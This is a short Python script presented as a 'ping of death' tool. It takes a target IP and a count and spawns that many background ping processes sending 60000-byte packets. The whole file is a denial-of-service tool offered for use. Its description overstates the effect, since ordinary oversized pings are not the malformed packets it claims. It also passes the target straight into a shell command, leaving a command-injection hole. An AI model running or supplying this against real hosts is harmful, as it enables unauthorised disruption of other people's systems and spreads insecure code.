# Description:
# This is ping of death tools(aka. POD) which is sending malformed or oversized packets using a simple ping command.
# This will keep going unless you stop(Ctrl+C)

# Usage:
# pingofdeath.py <target_ip> <attack try number>

import os
import sys
import time

target = sys.argv[1]
try_number = int(sys.argv[2])
now_number = 0

for num in range(1,try_number+1):
    print("Ping of Death Attacking Now : [%d]"%num)
    os.popen('ping -s 60000 %s >/dev/null &'%target).read()
    now_number += 1

while True:
    print("Total Attack Number Now : %d"%now_number)
    print("Stop : Ctrl + C")
    time.sleep(100000)
